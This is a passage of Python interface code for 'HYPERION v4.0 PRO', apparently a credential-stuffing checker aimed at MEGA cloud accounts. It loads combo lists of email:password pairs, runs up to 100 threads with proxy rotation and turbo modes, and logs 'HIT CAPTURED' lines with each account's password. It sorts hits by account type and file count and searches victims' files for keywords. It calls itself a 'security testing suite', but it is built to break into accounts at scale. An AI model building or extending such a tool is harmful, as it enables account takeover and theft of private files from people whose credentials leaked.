                file_matches = re.findall(r'[\w\.-]+\.[a-zA-Z]{2,4}', files_str)
                found_files = [f for f in file_matches if keyword_lower in f.lower()]
                return True, found_files[:10]  # Limit to first 10 matches
                
        except Exception as e:
            logger.debug(f"Keyword search error: {e}")
            
        return False, []
                    
    def update_hits_display(self):
        """Update the visual hits categorization display"""
        if not hasattr(self, 'hits_widgets'):
            return
            
        total_hits = len(self.hits)
        if total_hits == 0:
            # Reset all displays to 0
            for category_data in self.hits_widgets.values():
                category_data['count_label'].configure(text="0")
                category_data['progress_bar'].set(0)
            return
            
        # Update each category
        for category, hits in self.hits_categories.items():
            category_lower = category.lower()
            if category_lower in self.hits_widgets:
                count = len(hits)
                percentage = count / total_hits if total_hits > 0 else 0
                
                # Update count label
                self.hits_widgets[category_lower]['count_label'].configure(text=str(count))
                
                # Update progress bar
                self.hits_widgets[category_lower]['progress_bar'].set(percentage)
                
    def update_live_hits_display(self, result):
        """Update live hits display with detailed information"""
        try:
            hit_data = {
                'email': result.email,
                'password': result.password,
                'account_type': result.account_type,
                'storage_used': result.storage_used,
                'file_count': getattr(result, 'file_count', 0),
                'folder_count': getattr(result, 'folder_count', 0),
                'timestamp': result.timestamp
            }
            
            # Categorize for live display
            if result.account_type == 'PRO':
                self.live_hits_data['pro_accounts'].append(hit_data)
            elif result.account_type in ['FREE_USED', 'FREE_EMPTY']:
                if hit_data['file_count'] >= 5:
                    self.live_hits_data['free_with_files'].append(hit_data)
                else:
                    self.live_hits_data['free_empty'].append(hit_data)
                    
            # Log to terminal with enhanced details
            files_info = f"Files: {hit_data['file_count']}, Folders: {hit_data['folder_count']}"
            self.log_terminal(
                f"🎯 HIT CAPTURED: [{result.account_type}] {result.email} | {result.storage_used} | {files_info}", 
                "success"
            )
            
        except Exception as e:
            logger.debug(f"Error updating live hits display: {e}")
    
    def create_hacker_ui(self):
        """Create professional modern interface"""
        
        # Modern fonts
        header_font = ctk.CTkFont(family="Segoe UI", size=20, weight="bold")
        ui_font = ctk.CTkFont(family="Segoe UI", size=12)
        terminal_font = ctk.CTkFont(family="Consolas", size=11)
        
        # ===== MODERN HEADER =====
        header_frame = ctk.CTkFrame(
            self,
            height=70,
            fg_color=HackerTheme.BG_SECONDARY,
            corner_radius=10
        )
        header_frame.pack(fill="x", padx=15, pady=(15, 10))
        header_frame.pack_propagate(False)
        
        # Modern title
        title_container = ctk.CTkFrame(header_frame, fg_color="transparent")
        title_container.pack(side="left", fill="y", padx=20)
        
        title_label = ctk.CTkLabel(
            title_container,
            text="🚀 HYPERION v4.0 PRO",
            font=header_font,
            text_color=HackerTheme.PRIMARY
        )
        title_label.pack(anchor="w", pady=(10, 0))
        
        subtitle_label = ctk.CTkLabel(
            title_container,
            text="Professional MEGA Security Testing Suite",
            font=ctk.CTkFont(family="Segoe UI", size=10),
            text_color=HackerTheme.TEXT_SECONDARY
        )
        subtitle_label.pack(anchor="w")
        
        # Status with indicator
        status_container = ctk.CTkFrame(header_frame, fg_color="transparent")
        status_container.pack(side="right", fill="y", padx=20)
        
        self.status_indicator = ctk.CTkLabel(
            status_container,
            text="●",
            font=ctk.CTkFont(size=20),
            text_color=HackerTheme.SUCCESS
        )
        self.status_indicator.pack(side="right", padx=(0, 5), pady=20)
        
        self.status_label = ctk.CTkLabel(
            status_container,
            text="SYSTEM READY",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            text_color=HackerTheme.SUCCESS
        )
        self.status_label.pack(side="right", pady=20)
        
        # ===== PROFESSIONAL LAYOUT =====
        main_container = ctk.CTkFrame(self, fg_color="transparent")
        main_container.pack(fill="both", expand=True, padx=15, pady=10)
        
        # Configure modern grid
        main_container.grid_columnconfigure(0, weight=2)
        main_container.grid_columnconfigure(1, weight=3)
        main_container.grid_rowconfigure(0, weight=1)
        main_container.grid_rowconfigure(1, weight=1)
        main_container.grid_rowconfigure(2, weight=0)
        
        # Left Column - Controls & Config
        left_panel = ctk.CTkScrollableFrame(
            main_container,
            fg_color=HackerTheme.BG_SECONDARY,
            corner_radius=10,
            scrollbar_button_color=HackerTheme.PRIMARY,
            scrollbar_button_hover_color=HackerTheme.SUCCESS
        )
        left_panel.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=(0, 10))
        
        # Right Column - Terminal & Results
        right_panel = ctk.CTkFrame(
            main_container,
            fg_color=HackerTheme.BG_SECONDARY,
            corner_radius=10
        )
        right_panel.grid(row=0, column=1, sticky="nsew", pady=(0, 10))
        
        # Bottom Right - Live Stats Dashboard
        stats_panel = ctk.CTkFrame(
            main_container,
            fg_color=HackerTheme.BG_SECONDARY,
            corner_radius=10,
            height=200
        )
        stats_panel.grid(row=1, column=1, sticky="nsew")
        stats_panel.grid_propagate(False)
        
        # Progress Bar Section
        progress_panel = ctk.CTkFrame(
            main_container,
            fg_color=HackerTheme.BG_SECONDARY,
            corner_radius=10,
            height=80
        )
        progress_panel.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(10, 0))
        progress_panel.grid_propagate(False)
        
        # Create organized sections
        self.create_professional_controls(left_panel, ui_font, terminal_font)
        self.create_terminal_section(right_panel, terminal_font)
        self.create_progress_section(progress_panel, ui_font)
        self.create_modern_stats(stats_panel, ui_font)
    
    def create_professional_controls(self, parent, ui_font, terminal_font):
        """Create professional organized control panel"""
        
        # Section 1: File Management
        self.create_section_header(parent, "📁 FILE MANAGEMENT")
        
        file_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN, corner_radius=8)
        file_frame.pack(fill="x", padx=15, pady=(5, 15))
        
        # Load combo with modern styling
        load_btn = ctk.CTkButton(
            file_frame,
            text="📂 LOAD COMBO FILE",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=HackerTheme.PRIMARY,
            hover_color="#0088cc",
            corner_radius=8,
            height=40,
            command=self.load_combo_file
        )
        load_btn.pack(fill="x", padx=15, pady=15)
        
        # Combo info with modern display
        self.combo_info = ctk.CTkTextbox(
            file_frame,
            height=70,
            font=ui_font,
            fg_color=HackerTheme.BG_SECONDARY,
            text_color=HackerTheme.TEXT_PRIMARY,
            corner_radius=6
        )
        self.combo_info.pack(fill="x", padx=15, pady=(0, 15))
        self.combo_info.configure(state="disabled")
        self.combo_info.insert("0.0", "No combo file loaded")
        
        # Section 2: Configuration & Settings
        self.create_section_header(parent, "⚙️ CONFIGURATION")
        
        config_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN, corner_radius=8)
        config_frame.pack(fill="x", padx=15, pady=(5, 15))
        
        # Threads with slider + button control
        threads_container = ctk.CTkFrame(config_frame, fg_color="transparent")
        threads_container.pack(fill="x", padx=15, pady=10)
        
        threads_label = ctk.CTkLabel(
            threads_container,
            text="Threads:",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold")
        )
        threads_label.pack(anchor="w")
        
        threads_row = ctk.CTkFrame(threads_container, fg_color="transparent")
        threads_row.pack(fill="x", pady=(5, 0))
        
        self.threads_slider = ctk.CTkSlider(
            threads_row,
            from_=1,
            to=100,
            number_of_steps=99,
            progress_color=HackerTheme.PRIMARY,
            command=self.update_threads_display
        )
        self.threads_slider.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.threads_slider.set(25)
        
        self.threads_display = ctk.CTkLabel(
            threads_row,
            text="25",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            text_color=HackerTheme.PRIMARY,
            width=40
        )
        self.threads_display.pack(side="right")
        
        # Speed settings with modern dropdown
        speed_container = ctk.CTkFrame(config_frame, fg_color="transparent")
        speed_container.pack(fill="x", padx=15, pady=10)
        
        speed_label = ctk.CTkLabel(
            speed_container,
            text="Speed Mode:",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold")
        )
        speed_label.pack(anchor="w")
        
        self.speed_var = ctk.CTkOptionMenu(
            speed_container,
            values=["🐌 Safe Mode", "⚡ Fast Mode", "🚀 Turbo Mode"],
            font=ui_font,
            corner_radius=6,
            fg_color=HackerTheme.PRIMARY,
            button_color=HackerTheme.PRIMARY,
            button_hover_color="#0088cc"
        )
        self.speed_var.pack(fill="x", pady=(5, 0))
        self.speed_var.set("🚀 Turbo Mode")
        
        # Proxy settings
        proxy_container = ctk.CTkFrame(config_frame, fg_color="transparent")
        proxy_container.pack(fill="x", padx=15, pady=10)
        
        self.use_proxies = ctk.CTkCheckBox(
            proxy_container,
            text="Use Proxy Rotation",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            checkbox_width=20,
            checkbox_height=20,
            corner_radius=4,
            fg_color=HackerTheme.PRIMARY,
            hover_color="#0088cc"
        )
        self.use_proxies.pack(anchor="w")
        self.use_proxies.select()
        
        # Section 2.5: Performance Settings
        self.create_section_header(parent, "⚡ PERFORMANCE")
        
        perf_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN, corner_radius=8)
        perf_frame.pack(fill="x", padx=15, pady=(5, 15))
        
        # GPU Acceleration
        gpu_container = ctk.CTkFrame(perf_frame, fg_color="transparent")
        gpu_container.pack(fill="x", padx=15, pady=10)
        
        self.use_gpu = ctk.CTkCheckBox(
            gpu_container,
            text="🪶 Lightweight Mode (No External Dependencies)",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            checkbox_width=20,
            checkbox_height=20,
            corner_radius=4,
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00aa00",
            state="disabled"  # Always enabled in lightweight mode
        )
        self.use_gpu.pack(anchor="w")
        self.use_gpu.select()  # Always selected for lightweight mode
        
        # Multiprocessing
        mp_container = ctk.CTkFrame(perf_frame, fg_color="transparent")
        mp_container.pack(fill="x", padx=15, pady=10)
        
        self.use_multiprocessing = ctk.CTkCheckBox(
            mp_container,
            text=f"Multi-Core Processing ({self.performance_optimizer.cpu_cores} cores)",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold"),
            checkbox_width=20,
            checkbox_height=20,
            corner_radius=4,
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00aa00"
        )
        self.use_multiprocessing.pack(anchor="w")
        self.use_multiprocessing.select()
        
        # Memory optimization
        memory_container = ctk.CTkFrame(perf_frame, fg_color="transparent")
        memory_container.pack(fill="x", padx=15, pady=10)
        
        memory_label = ctk.CTkLabel(
            memory_container,
            text=f"RAM Usage Limit ({self.performance_optimizer.ram_total:.1f} GB available):",
            font=ctk.CTkFont(family="Segoe UI", size=11, weight="bold")
        )
        memory_label.pack(anchor="w")
        
        memory_row = ctk.CTkFrame(memory_container, fg_color="transparent")
        memory_row.pack(fill="x", pady=(5, 0))
        
        self.memory_slider = ctk.CTkSlider(
            memory_row,
            from_=30,
            to=90,
            number_of_steps=60,
            progress_color=HackerTheme.WARNING,
            command=self.update_memory_display
        )
        self.memory_slider.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.memory_slider.set(70)
        
        self.memory_display = ctk.CTkLabel(
            memory_row,
            text="70%",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            text_color=HackerTheme.WARNING,
            width=50
        )
        self.memory_display.pack(side="right")
        
        # Section 3: Actions & Controls
        self.create_section_header(parent, "🚀 ACTIONS")
        
        actions_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN, corner_radius=8)
        actions_frame.pack(fill="x", padx=15, pady=(5, 15))
        
        # Main action buttons
        buttons_grid = ctk.CTkFrame(actions_frame, fg_color="transparent")
        buttons_grid.pack(fill="x", padx=15, pady=15)
        
        buttons_grid.grid_columnconfigure(0, weight=1)
        buttons_grid.grid_columnconfigure(1, weight=1)
        
        self.start_btn = ctk.CTkButton(
            buttons_grid,
            text="🚀 START CHECKING",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=HackerTheme.SUCCESS,
            hover_color="#00aa00",
            corner_radius=8,
            height=45,
            command=self.start_turbo_checking
        )
        self.start_btn.grid(row=0, column=0, sticky="ew", padx=(0, 5))
        
        self.stop_btn = ctk.CTkButton(
            buttons_grid,
            text="⏹️ STOP",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            fg_color=HackerTheme.ERROR,
            hover_color="#cc0000",
            corner_radius=8,
            height=45,
            state="disabled",
            command=self.stop_checking
        )
        self.stop_btn.grid(row=0, column=1, sticky="ew", padx=(5, 0))
        
        # Advanced features
        advanced_row = ctk.CTkFrame(actions_frame, fg_color="transparent")
        advanced_row.pack(fill="x", padx=15, pady=(0, 15))
        
        advanced_row.grid_columnconfigure(0, weight=1)
        advanced_row.grid_columnconfigure(1, weight=1)
        
        single_check_btn = ctk.CTkButton(
            advanced_row,
            text="🔍 SINGLE CHECK",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            fg_color=HackerTheme.PRIMARY,
            hover_color="#0088cc",
            corner_radius=6,
            height=35,
            command=self.show_single_check_dialog
        )
        single_check_btn.grid(row=0, column=0, sticky="ew", padx=(0, 5))
        
        hits_manager_btn = ctk.CTkButton(
            advanced_row,
            text="📊 HITS MANAGER",
            font=ctk.CTkFont(family="Segoe UI", size=11),
            fg_color=HackerTheme.PRIMARY,
            hover_color="#0088cc",
            corner_radius=6,
            height=35,
            command=self.show_full_details
        )
        hits_manager_btn.grid(row=0, column=1, sticky="ew", padx=(5, 0))
    
    def create_terminal_section(self, parent, terminal_font):
        """Create modern terminal section"""
        parent.grid_rowconfigure(1, weight=1)
        parent.grid_columnconfigure(0, weight=1)
        
        # Terminal header
        terminal_header = ctk.CTkFrame(parent, fg_color="transparent", height=50)
        terminal_header.grid(row=0, column=0, sticky="ew", padx=15, pady=(15, 5))
        terminal_header.grid_propagate(False)
        
        header_label = ctk.CTkLabel(
            terminal_header,
            text="🖥️ LIVE TERMINAL",
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header_label.pack(side="left", pady=10)
        
        # Clear button
        clear_btn = ctk.CTkButton(
            terminal_header,
            text="🧠 CLEAR",
            font=ctk.CTkFont(family="Segoe UI", size=10),
            fg_color=HackerTheme.ERROR,
            hover_color="#990000",
            corner_radius=6,
            height=30,
            width=80,
            command=self.clear_terminal
        )
        clear_btn.pack(side="right", pady=10)
        
        # Terminal with modern styling
        self.terminal = ctk.CTkTextbox(
            parent,
            font=terminal_font,
            fg_color=HackerTheme.BG_MAIN,
            text_color=HackerTheme.TEXT_PRIMARY,
            corner_radius=8,
            scrollbar_button_color=HackerTheme.PRIMARY,
            scrollbar_button_hover_color=HackerTheme.SUCCESS
        )
        self.terminal.grid(row=1, column=0, sticky="nsew", padx=15, pady=(0, 15))
        self.terminal.configure(state="disabled")
    
    def create_progress_section(self, parent, ui_font):
        """Create modern progress bar section"""
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_rowconfigure(0, weight=1)
        
        progress_container = ctk.CTkFrame(parent, fg_color="transparent")
        progress_container.grid(row=0, column=0, sticky="ew", padx=15, pady=15)
        progress_container.grid_columnconfigure(1, weight=1)
        
        # Progress label
        progress_label = ctk.CTkLabel(
            progress_container,
            text="PROGRESS:",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            text_color=HackerTheme.TEXT_PRIMARY
        )
        progress_label.grid(row=0, column=0, padx=(0, 15), sticky="w")
        
        # Progress bar with modern styling
        self.progress_bar = ctk.CTkProgressBar(
            progress_container,
            height=20,
            corner_radius=10,
            progress_color=HackerTheme.SUCCESS,
            fg_color=HackerTheme.BG_MAIN
        )
        self.progress_bar.grid(row=0, column=1, sticky="ew", padx=(0, 15))
        self.progress_bar.set(0)
        
        # Progress text overlay
        self.progress_text = ctk.CTkLabel(
            progress_container,
            text="0 / 0 (0.0%)",
            font=ctk.CTkFont(family="Consolas", size=11, weight="bold"),
            text_color=HackerTheme.TEXT_PRIMARY
        )
        self.progress_text.grid(row=0, column=2, padx=(15, 0), sticky="e")
    
    def create_modern_stats(self, parent, ui_font):
        """Create modern statistics dashboard"""
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_columnconfigure(1, weight=1)
        parent.grid_columnconfigure(2, weight=1)
        parent.grid_columnconfigure(3, weight=1)
        parent.grid_rowconfigure(0, weight=1)
        parent.grid_rowconfigure(1, weight=1)
        
        # Stats header
        stats_header = ctk.CTkLabel(
            parent,
            text="📊 LIVE STATISTICS",
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        stats_header.grid(row=0, column=0, columnspan=4, pady=(15, 10))
        
        # Create modern stat cards
        self.stat_widgets = {}
        
        # Total card
        total_card = self.create_stat_card(parent, "�", "TOTAL", "0", HackerTheme.PRIMARY)
        total_card['card'].grid(row=1, column=0, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['total'] = total_card['value']
        
        # Checked card
        checked_card_data = self.create_stat_card(parent, "✅", "CHECKED", "0", HackerTheme.PRIMARY)
        checked_card_data['card'].grid(row=1, column=1, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['checked'] = checked_card_data['value']
        
        # Hits card
        hits_card_data = self.create_stat_card(parent, "🎯", "HITS", "0", HackerTheme.SUCCESS)
        hits_card_data['card'].grid(row=1, column=2, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['hits'] = hits_card_data['value']
        
        # Rate card
        rate_card_data = self.create_stat_card(parent, "⚡", "CPM", "0", HackerTheme.WARNING)
        rate_card_data['card'].grid(row=1, column=3, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['rate'] = rate_card_data['value']
        
        # Performance monitoring row
        parent.grid_rowconfigure(2, weight=0)
        
        perf_header = ctk.CTkLabel(
            parent,
            text="🔧 SYSTEM PERFORMANCE",
            font=ctk.CTkFont(family="Segoe UI", size=12, weight="bold"),
            text_color=HackerTheme.TEXT_SECONDARY
        )
        perf_header.grid(row=2, column=0, columnspan=4, pady=(10, 5))
        
        # Memory usage card
        memory_card_data = self.create_stat_card(parent, "🧠", "RAM", "0%", HackerTheme.WARNING)
        memory_card_data['card'].grid(row=3, column=0, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['memory'] = memory_card_data['value']
        
        # CPU usage card
        cpu_card_data = self.create_stat_card(parent, "💻", "CPU", "0%", HackerTheme.PRIMARY)
        cpu_card_data['card'].grid(row=3, column=1, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['cpu'] = cpu_card_data['value']
        
        # Lightweight mode status card
        lightweight_status = "ACTIVE"
        lightweight_color = HackerTheme.SUCCESS
        lightweight_card_data = self.create_stat_card(parent, "🪶", "LIGHT", lightweight_status, lightweight_color)
        lightweight_card_data['card'].grid(row=3, column=2, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['gpu'] = lightweight_card_data['value']
        
        # Threads card
        threads_card_data = self.create_stat_card(parent, "🔀", "THREADS", str(self.performance_optimizer.optimal_threads), HackerTheme.PRIMARY)
        threads_card_data['card'].grid(row=3, column=3, padx=10, pady=(0, 15), sticky="nsew")
        self.stat_widgets['threads'] = threads_card_data['value']
    
    def create_stat_card(self, parent, icon, label, value, color):
        """Create a modern stat card"""
        card = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN, corner_radius=8)
        
        # Icon
        icon_label = ctk.CTkLabel(
            card,
            text=icon,
            font=ctk.CTkFont(size=20),
            text_color=color
        )
        icon_label.pack(pady=(10, 5))
        
        # Value
        value_label = ctk.CTkLabel(
            card,
            text=value,
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=color
        )
        value_label.pack()
        
        # Label
        label_text = ctk.CTkLabel(
            card,
            text=label,
            font=ctk.CTkFont(family="Segoe UI", size=10),
            text_color=HackerTheme.TEXT_SECONDARY
        )
        label_text.pack(pady=(0, 10))
        
        return {'card': card, 'value': value_label}
    
    def create_essential_controls(self, parent, ui_font):
        """Create only essential controls for main tab"""
        header = ctk.CTkLabel(parent, text="📁 COMBO FILE", font=ctk.CTkFont(size=14, weight="bold"))
        header.pack(pady=(10, 5))
        
        # Combo file section
        combo_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN)
        combo_frame.pack(fill="x", padx=10, pady=5)
        
        load_btn = ctk.CTkButton(
            combo_frame, text="LOAD COMBO", font=ui_font,
            fg_color=HackerTheme.PRIMARY, hover_color="#0088cc",
            command=self.load_combo_file, height=35
        )
        load_btn.pack(pady=10)
        
        # Combo info display
        self.combo_info = ctk.CTkTextbox(
            combo_frame, height=60, font=ui_font,
            fg_color=HackerTheme.BG_SECONDARY, text_color=HackerTheme.TEXT_PRIMARY
        )
        self.combo_info.pack(fill="x", padx=10, pady=(0, 10))
        self.combo_info.configure(state="disabled")
        self.combo_info.insert("0.0", "No combo file loaded")
    
    def create_main_actions(self, parent, ui_font):
        """Create main action buttons for essential functions"""
        header = ctk.CTkLabel(parent, text="🚀 MAIN ACTIONS", font=ctk.CTkFont(size=14, weight="bold"))
        header.pack(pady=(10, 5))
        
        # Start/Stop buttons
        button_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN)
        button_frame.pack(fill="x", padx=10, pady=5)
        
        # Row 1 - Start/Stop
        row1 = ctk.CTkFrame(button_frame, fg_color="transparent")
        row1.pack(fill="x", pady=5)
        
        self.start_btn = ctk.CTkButton(
            row1, text="🚀 START TURBO", font=ui_font,
            fg_color=HackerTheme.SUCCESS, hover_color="#00aa00",
            command=self.start_turbo_checking, height=40
        )
        self.start_btn.pack(side="left", fill="x", expand=True, padx=(5, 2))
        
        self.stop_btn = ctk.CTkButton(
            row1, text="⏹️ STOP", font=ui_font,
            fg_color=HackerTheme.ERROR, hover_color="#cc0000",
            command=self.stop_checking, height=40, state="disabled"
        )
        self.stop_btn.pack(side="left", fill="x", expand=True, padx=(2, 5))
        
        # Row 2 - Auto-save status
        row2 = ctk.CTkFrame(button_frame, fg_color="transparent")
        row2.pack(fill="x", pady=5)
        
        self.auto_save_label = ctk.CTkLabel(
            row2, text="✅ AUTO-SAVE: ENABLED",
            font=ctk.CTkFont(size=11, weight="bold"),
            text_color=HackerTheme.SUCCESS
        )
        self.auto_save_label.pack(pady=5)
    
    def create_enhanced_single_check(self, parent, ui_font, terminal_font):
        """Create enhanced single account checking interface"""
        header = ctk.CTkLabel(parent, text="🔍 SINGLE ACCOUNT CHECKER", font=ctk.CTkFont(size=18, weight="bold"))
        header.pack(pady=20)
        
        # Input fields
        input_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN)
        input_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(input_frame, text="Email:", font=ui_font).pack(anchor="w", padx=10, pady=(10, 0))
        self.single_email = ctk.CTkEntry(input_frame, font=ui_font, height=35)
        self.single_email.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(input_frame, text="Password:", font=ui_font).pack(anchor="w", padx=10, pady=(10, 0))
        self.single_password = ctk.CTkEntry(input_frame, font=ui_font, height=35, show="*")
        self.single_password.pack(fill="x", padx=10, pady=(5, 10))
        
        # Check button
        check_btn = ctk.CTkButton(
            parent, text="🔍 CHECK ACCOUNT", font=ctk.CTkFont(size=14, weight="bold"),
            fg_color=HackerTheme.PRIMARY, hover_color="#0088cc",
            command=self.single_check_enhanced, height=45, width=200
        )
        check_btn.pack(pady=20)
        
        # Results display
        results_frame = ctk.CTkFrame(parent, fg_color=HackerTheme.BG_MAIN)
        results_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        ctk.CTkLabel(results_frame, text="Results:", font=ui_font).pack(anchor="w", padx=10, pady=(10, 0))
        self.single_results = ctk.CTkTextbox(
            results_frame, font=terminal_font,
            fg_color=HackerTheme.BG_SECONDARY, text_color=HackerTheme.TEXT_PRIMARY
        )
        self.single_results.pack(fill="both", expand=True, padx=10, pady=(5, 10))
        self.single_results.configure(state="disabled")
    
    def create_modern_controls(self, parent, ui_font, terminal_font):
        """Create modern controls panel with compact design - NO SCROLLING"""
        
        # Header
        header = ctk.CTkLabel(
            parent,
            text="🎯 COMBO & SETTINGS",
            font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        header.pack(pady=(15, 10))
        
        # Content frame - no scrolling for speed
        content_frame = ctk.CTkFrame(parent, fg_color="transparent")
        content_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        # ===== COMBO SECTION =====
        combo_frame = ctk.CTkFrame(content_frame, fg_color=HackerTheme.BG_ELEVATED, height=120)
        combo_frame.pack(fill="x", pady=(0, 10))
        combo_frame.pack_propagate(False)
        
        # File buttons
        btn_frame = ctk.CTkFrame(combo_frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=15, pady=(15, 10))
        
        load_btn = ctk.CTkButton(
            btn_frame,
            text="📁 LOAD",
            font=ui_font,
            fg_color=HackerTheme.PRIMARY,
            hover_color=HackerTheme.PRIMARY_DARK,
            text_color=HackerTheme.BG_MAIN,
            height=40,
            command=self.load_combo_file
        )
        load_btn.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        merge_btn = ctk.CTkButton(
            btn_frame,
            text="🔗 MERGE",
            font=ui_font,
            fg_color=HackerTheme.ACCENT,
            hover_color="#cc0066",
            text_color="white",
            height=40,
            command=self.merge_combo_files
        )
        merge_btn.pack(side="left", fill="x", expand=True, padx=(5, 0))
        
        # Combo info display
        self.combo_info = ctk.CTkTextbox(
            combo_frame,
            height=80,
            font=terminal_font,
            fg_color=HackerTheme.BG_TERMINAL,
            text_color=HackerTheme.TEXT_PRIMARY,
            border_width=1,
            border_color=HackerTheme.BORDER_MAIN
        )
        self.combo_info.pack(fill="x", padx=15, pady=(0, 15))
        self.combo_info.insert("1.0", "> No combo loaded\n> Awaiting file selection...")
        self.combo_info.configure(state="disabled")
        
        # ===== TURBO SETTINGS SECTION =====
        settings_frame = ctk.CTkFrame(content_frame, fg_color=HackerTheme.BG_ELEVATED, height=120)
        settings_frame.pack(fill="x", pady=(0, 10))
        settings_frame.pack_propagate(False)
        
        # Settings header
        settings_header = ctk.CTkLabel(
            settings_frame,
            text="⚡ TURBO SETTINGS",
            font=ctk.CTkFont(family="Consolas", size=12, weight="bold"),
            text_color=HackerTheme.ACCENT
        )
        settings_header.pack(pady=(10, 5))
        
        # Compact settings row
        settings_row = ctk.CTkFrame(settings_frame, fg_color="transparent")
        settings_row.pack(fill="x", padx=10, pady=(0, 10))
        
        # Threads
        ctk.CTkLabel(settings_row, text="Threads:", font=ui_font, text_color=HackerTheme.TEXT_SECONDARY).pack(side="left")
        self.threads_entry = ctk.CTkEntry(settings_row, width=60, font=terminal_font, fg_color=HackerTheme.BG_INPUT)
        self.threads_entry.pack(side="left", padx=(10, 20))
        self.threads_entry.insert(0, "25")  # Turbo default
        
        # Speed mode
        ctk.CTkLabel(settings_row, text="Speed:", font=ui_font, text_color=HackerTheme.TEXT_SECONDARY).pack(side="left")
        self.speed_var = ctk.CTkOptionMenu(settings_row, values=["🐌 Safe", "⚡ Fast", "🚀 Turbo"], width=100, font=ui_font)
        self.speed_var.pack(side="left", padx=(10, 0))
        self.speed_var.set("🚀 Turbo")
        
        # Proxy toggle
        self.proxy_var = ctk.BooleanVar(value=True)
        proxy_switch = ctk.CTkSwitch(
            settings_row,
            text="Proxies",
            font=ui_font,
            variable=self.proxy_var,
            progress_color=HackerTheme.PRIMARY,
            text_color=HackerTheme.TEXT_SECONDARY
        )
        proxy_switch.pack(side="right", padx=10)
        
        # Old action buttons removed - now in Quick Actions panel
    
    def create_terminal_panel(self, parent, terminal_font):
        """Create the right terminal panel"""
        
        # ===== STATS SECTION =====
        stats_frame = ctk.CTkFrame(
            parent,
            height=120,
            fg_color=HackerTheme.BG_ELEVATED,
            border_width=1,
            border_color=HackerTheme.BORDER_GLOW
        )
        stats_frame.pack(fill="x", padx=15, pady=(15, 10))
        stats_frame.pack_propagate(False)
        
        stats_title = ctk.CTkLabel(
            stats_frame,
            text="🎯 SCAN STATISTICS",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        stats_title.pack(pady=(10, 5))
        
        # Stats grid
        stats_grid = ctk.CTkFrame(stats_frame, fg_color="transparent")
        stats_grid.pack(fill="x", padx=15, pady=(0, 10))
        
        # Create stat cards
        self.stat_widgets = {}
        stats_layout = [
            ("Total", "0", HackerTheme.TEXT_SECONDARY),
            ("Checked", "0", HackerTheme.INFO),
            ("Hits", "0", HackerTheme.SUCCESS),
            ("Fails", "0", HackerTheme.ERROR)
        ]
        
        for i, (label, value, color) in enumerate(stats_layout):
            stat_frame = ctk.CTkFrame(stats_grid, fg_color=HackerTheme.BG_TERMINAL)
            stat_frame.grid(row=0, column=i, padx=5, pady=0, sticky="ew")
            stats_grid.columnconfigure(i, weight=1)
            
            ctk.CTkLabel(
                stat_frame,
                text=label,
                font=ctk.CTkFont(family="Consolas", size=9),
                text_color=HackerTheme.TEXT_TERTIARY
            ).pack(pady=(5, 0))
            
            self.stat_widgets[label.lower()] = ctk.CTkLabel(
                stat_frame,
                text=value,
                font=ctk.CTkFont(family="Consolas", size=16, weight="bold"),
                text_color=color
            )
            self.stat_widgets[label.lower()].pack(pady=(0, 5))
        
        # ===== TERMINAL SECTION =====
        terminal_label = ctk.CTkLabel(
            parent,
            text="📟 HYPERION TERMINAL",
            font=ctk.CTkFont(family="Consolas", size=14, weight="bold"),
            text_color=HackerTheme.PRIMARY
        )
        terminal_label.pack(padx=15, pady=(10, 5))
        
        self.terminal = ctk.CTkTextbox(
            parent,
            font=terminal_font,
            fg_color=HackerTheme.BG_TERMINAL,
            text_color=HackerTheme.TEXT_PRIMARY,
            border_width=2,
            border_color=HackerTheme.BORDER_GLOW,
            scrollbar_button_color=HackerTheme.PRIMARY,
